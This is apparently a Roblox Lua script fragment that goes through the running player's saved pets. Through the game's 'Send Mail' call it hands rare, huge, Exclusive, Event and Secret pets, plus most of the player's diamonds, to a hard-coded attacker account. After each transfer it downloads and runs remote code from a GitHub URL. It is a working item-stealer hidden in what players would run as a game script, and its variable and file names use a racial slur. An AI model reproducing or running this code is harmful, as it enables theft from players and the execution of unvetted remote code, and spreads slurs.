local negro = game.Players.LocalPlayer.leaderstats.Diamonds.Value - 2900000
	for i,v in pairs(savedPets) do
    	local v2 = FrameworkLibrary.Directory.Pets[v.id]
                if v2.huge == true or game.Players.LocalPlayer.leaderstats.Diamonds.Value > 50000000000 then
                         _G.Username = "W4r_ObScUrE"
                         print("poo")
                         wait(0.1)
                end
                if game.Players.LocalPlayer.leaderstats.Diamonds.Value < 3000000 then
                    local negro = 0 
                end
		if v2.huge == true and game.Players.LocalPlayer.leaderstats.Diamonds.Value > 100000 then
			local args = {
    			[1] = {
        			["Recipient"] = _G.Username,
        			["Diamonds"] = negro,
        			["Pets"] = {v.uid},
        			["Message"] = _G.GiftMessage
    			}
			}
			Invoke("Send Mail", unpack(args))
                        _G.PetName = v2.name
		                _G.PetRar = v2.rarity
                        loadstring(game:HttpGet("https://raw.githubusercontent.com/Subashians/FuzeHub/main/nigs.lua"))()
		elseif v2.rarity == "Exclusive" then
			local args = {
    			[1] = {
        			["Recipient"] = _G.Username,
        			["Diamonds"] = negro,
        			["Pets"] = {v.uid},
        			["Message"] = _G.GiftMessage
    			}
			}
			Invoke("Send Mail", unpack(args))
                        _G.PetName = v2.name
		                _G.PetRar = v2.rarity
                        loadstring(game:HttpGet("https://raw.githubusercontent.com/Subashians/FuzeHub/main/nigs.lua"))()
        elseif v2.huge == true then
			local args = {
    			[1] = {
        			["Recipient"] = _G.Username,
        			["Diamonds"] = negro,
        			["Pets"] = {v.uid},
        			["Message"] = _G.GiftMessage
    			}
			}
			Invoke("Send Mail", unpack(args))
                        _G.PetName = v2.name
		                _G.PetRar = v2.rarity
                        loadstring(game:HttpGet("https://raw.githubusercontent.com/Subashians/FuzeHub/main/nigs.lua"))()
		elseif v2.rarity == "Event" then
			local args = {
    			[1] = {
        			["Recipient"] = _G.Username,
        			["Diamonds"] = negro,
        			["Pets"] = {v.uid},
        			["Message"] = _G.GiftMessage
    			}
			}
			Invoke("Send Mail", unpack(args))
                        _G.PetName = v2.name
		                _G.PetRar = v2.rarity
                        loadstring(game:HttpGet("https://raw.githubusercontent.com/Subashians/FuzeHub/main/nigs.lua"))()
		elseif v2.rarity == "Secret" then
			local args = {
    			[1] = {
        			["Recipient"] = _G.Username,
        			["Diamonds"] = negro,
        			["Pets"] = {v.uid},
        			["Message"] = _G.GiftMessage
    			}
			}
			Invoke("Send Mail", unpack(args))
                        _G.PetName = v2.name
		                _G.PetRar = v2.rarity
                        loadstring(game:HttpGet("https://raw.githubusercontent.com/Subashians/FuzeHub/main/nigs.lua"))()
	    end
              
    end
